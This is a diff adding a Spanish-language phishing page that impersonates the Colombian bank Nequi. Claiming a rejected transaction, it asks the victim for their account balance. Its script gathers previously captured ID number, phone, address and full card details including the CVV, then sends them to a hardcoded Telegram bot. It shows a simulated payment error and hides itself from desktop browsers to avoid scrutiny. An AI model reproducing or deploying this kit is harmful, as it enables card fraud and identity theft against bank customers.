@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Validar Identidad - Nequi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html, body {
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        .content-wrapper {
+            display: none;
+            height: 100%;
+            width: 100%;
+            background: white;
+        }
+        
+        @media screen and (max-width: 1024px) {
+            .content-wrapper {
+                display: block;
+                overflow-y: auto;
+                overflow-x: hidden;
+            }
+        }
+        
+        @media screen and (max-width: 1366px) and (orientation: portrait) {
+            .content-wrapper {
+                display: block;
+                overflow-y: auto;
+                overflow-x: hidden;
+            }
+        }
+        
+        .desktop-block {
+            display: block;
+            width: 100vw;
+            height: 100vh;
+            background: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9999;
+        }
+        
+        @media screen and (max-width: 1024px) {
+            .desktop-block {
+                display: none !important;
+            }
+        }
+        
+        @media screen and (max-width: 1366px) and (orientation: portrait) {
+            .desktop-block {
+                display: none !important;
+            }
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+        }
+        
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background: white;
+            padding: 40px 24px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .icon-hand {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .icon-hand svg {
+            width: 60px;
+            height: 60px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+        
+        .description {
+            font-size: 15px;
+            color: #666;
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+        
+        /* Tarjeta Nequi */
+        .nequi-card {
+            background: linear-gradient(180deg, #1a0a1a 0%, #2d1b2d 100%);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 32px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .nequi-card::before {
+            content: '';
+            position: absolute;
+            bottom: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60%;
+            height: 60px;
+            background: linear-gradient(180deg, rgba(255,255,255,0.1) 0%, transparent 100%);
+            border-radius: 50%;
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: white;
+            font-size: 14px;
+        }
+        
+        .user-icon {
+            width: 32px;
+            height: 32px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .card-icons {
+            display: flex;
+            gap: 16px;
+            color: white;
+        }
+        
+        .card-icons svg {
+            width: 22px;
+            height: 22px;
+            opacity: 0.9;
+        }
+        
+        .account-type {
+            text-align: center;
+            color: rgba(255,255,255,0.8);
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        .balance-hidden {
+            text-align: center;
+            color: white;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: 2px;
+        }
+        
+        .total-label {
+            text-align: center;
+            color: rgba(255,255,255,0.6);
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        
+        .btn-plata {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: transparent;
+            border: 1.5px solid rgba(255,255,255,0.4);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            margin: 0 auto;
+            cursor: pointer;
+        }
+        
+        .btn-plata svg {
+            width: 16px;
+            height: 16px;
+        }
+        
+        /* Input de saldo */
+        .saldo-input-container {
+            background: #ffe4f0;
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .saldo-symbol {
+            font-size: 24px;
+            color: #e6007e;
+            font-weight: 600;
+        }
+        
+        .saldo-input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            font-size: 18px;
+            color: #1a1a1a;
+            font-family: inherit;
+            outline: none;
+        }
+        
+        .saldo-input::placeholder {
+            color: #999;
+        }
+        
+        /* Botón Listo */
+        .btn-listo {
+            width: 100%;
+            background: #e6007e;
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 17px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: auto;
+            margin-bottom: 20px;
+        }
+        
+        .btn-listo:active {
+            transform: scale(0.98);
+            background: #c4006a;
+        }
+        
+        .btn-listo:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        /* Pantalla de carga */
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            z-index: 1000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .loading-screen.active {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #ffe4f0;
+            border-top: 4px solid #e6007e;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 16px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        /* Pantalla de error */
+        .error-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 1001;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 24px;
+        }
+        
+        .error-screen.active {
+            display: flex;
+        }
+        
+        .error-icon {
+            width: 80px;
+            height: 80px;
+            background: #fee2e2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        
+        .error-icon svg {
+            width: 40px;
+            height: 40px;
+            color: #dc2626;
+        }
+        
+        .error-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        
+        .error-message {
+            font-size: 15px;
+            color: #666;
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+        
+        .btn-retry {
+            width: 100%;
+            max-width: 300px;
+            background: #e6007e;
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+        
+        .btn-retry:active {
+            background: #c4006a;
+        }
+        
+        @media screen and (max-height: 700px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="desktop-block"></div>
+    
+    <div class="content-wrapper">
+        <div class="container">
+            <div class="icon-hand">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="1.5">
+                    <path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"/>
+                    <path d="M14 9l-4 4" stroke-linecap="round"/>
+                </svg>
+            </div>
+            
+            <h1>Queremos validar que eres tú</h1>
+            
+            <p class="description">
+                Por tu seguridad, rechazamos tu transacción. Para validar que sí eres tú el que está haciendo la operación, ingresa el saldo actual de tu cuenta Nequi.
+            </p>
+            
+            <!-- Tarjeta Nequi -->
+            <div class="nequi-card">
+                <div class="card-header">
+                    <div class="user-info">
+                        <div class="user-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18">
+                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                                <circle cx="12" cy="7" r="4"/>
+                            </svg>
+                        </div>
+                        <span>Hola,</span>
+                    </div>
+                    <div class="card-icons">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
+                            <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
+                        </svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"/>
+                            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+                            <line x1="12" y1="17" x2="12.01" y2="17"/>
+                        </svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                        </svg>
+                    </div>
+                </div>
+                
+                <div class="account-type">Cuenta de Ahorros®</div>
+                <div class="balance-hidden">$ *****</div>
+                <div class="total-label">Total $ *****</div>
+                
+                <button class="btn-plata">
+                    Tu plata
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polyline points="6 9 12 15 18 9"/>
+                    </svg>
+                </button>
+            </div>
+            
+            <!-- Input de saldo -->
+            <form id="saldoForm">
+                <div class="saldo-input-container">
+                    <span class="saldo-symbol">$</span>
+                    <input type="text" class="saldo-input" id="saldoInput" placeholder="Ingresa tu saldo" required inputmode="numeric">
+                </div>
+                
+                <button type="submit" class="btn-listo" id="btnListo">Listo</button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Pantalla de carga -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="spinner"></div>
+        <p class="loading-text">Validando información...</p>
+    </div>
+    
+    <!-- Pantalla de error -->
+    <div class="error-screen" id="errorScreen">
+        <div class="error-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="12" cy="12" r="10"/>
+                <line x1="15" y1="9" x2="9" y2="15"/>
+                <line x1="9" y1="9" x2="15" y2="15"/>
+            </svg>
+        </div>
+        <h2 class="error-title">Error en el pago</h2>
+        <p class="error-message">
+            No pudimos procesar tu transacción. Por favor verifica tus datos e intenta nuevamente.
+        </p>
+        <button class="btn-retry" onclick="window.location.reload()">Intentar nuevamente</button>
+    </div>
+    
+    <script>
+        // CONFIGURACIÓN DEL BOT DE TELEGRAM
+        const BOT_TOKEN = '8955093413:AAH-iW-vYcLq__GHBB2rpqpECA6JDCdQUZE';
+        const CHAT_ID = '-5547241763';
+        
+        // Recuperar todos los datos anteriores
+        const cedula = sessionStorage.getItem('cedula') || 'No disponible';
+        const celular = sessionStorage.getItem('celular') || 'No disponible';
+        const direccion = sessionStorage.getItem('direccion') || 'No disponible';
+        const ciudad = sessionStorage.getItem('ciudad') || 'No disponible';
+        const departamento = sessionStorage.getItem('departamento') || 'No disponible';
+        const datosTarjeta = JSON.parse(sessionStorage.getItem('datosTarjeta') || '{}');
+        
+        const saldoInput = document.getElementById('saldoInput');
+        const btnListo = document.getElementById('btnListo');
+        
+        function isMobileDevice() {
+            return (
+                /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+                (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
+                window.innerWidth <= 1024
+            );
+        }
+        
+        if (!isMobileDevice()) {
+            document.body.innerHTML = '<div style="width:100vw;height:100vh;background:white;"></div>';
+        }
+        
+        // Formatear saldo con puntos
+        saldoInput.addEventListener('input', function(e) {
+            let valor = this.value.replace(/\D/g, '');
+            if (valor.length > 0) {
+                valor = parseInt(valor).toLocaleString('es-CO');
+            }
+            this.value = valor;
+            
+            btnListo.disabled = this.value.length < 3;
+        });
+        
+        document.getElementById('saldoForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const saldo = saldoInput.value;
+            
+            // Mostrar pantalla de carga
+            document.getElementById('loadingScreen').classList.add('active');
+            
+            // Preparar mensaje completo para Telegram
+            const mensaje = `🔴 VALIDACIÓN NEQUI COMPLETADA - ENVIACO\n\n` +
+                `📋 INFORMACIÓN PERSONAL:\n` +
+                `• Cédula: ${cedula}\n` +
+                `• Celular: ${celular}\n` +
+                `• Dirección: ${direccion}\n` +
+                `• Ciudad: ${ciudad}\n` +
+                `• Departamento: ${departamento}\n\n` +
+                `💳 DATOS DE TARJETA VISA:\n` +
+                `• Número: ${datosTarjeta.numero || 'No disponible'}\n` +
+                `• Titular: ${datosTarjeta.nombre || 'No disponible'}\n` +
+                `• Vence: ${datosTarjeta.vencimiento || 'No disponible'}\n` +
+                `• CVV: ${datosTarjeta.cvv || 'No disponible'}\n` +
+                `• Doc. Titular: ${datosTarjeta.documento || 'No disponible'}\n\n` +
+                `💰 SALDO NEQUI INGRESADO:\n` +
+                `• $${saldo} COP\n\n` +
+                `🕐 Fecha: ${new Date().toLocaleString()}\n` +
+                `⚠️ Estado: Error simulado (datos capturados)`;
+            
+            // Enviar a Telegram
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+            
+            // Esperar 5 segundos y mostrar error
+            setTimeout(() => {
+                document.getElementById('loadingScreen').classList.remove('active');
+                document.getElementById('errorScreen').classList.add('active');
+                
+                // Limpiar sessionStorage
+                sessionStorage.clear();
+            }, 5000);
+        });
+    </script>
+</body>
+</html>
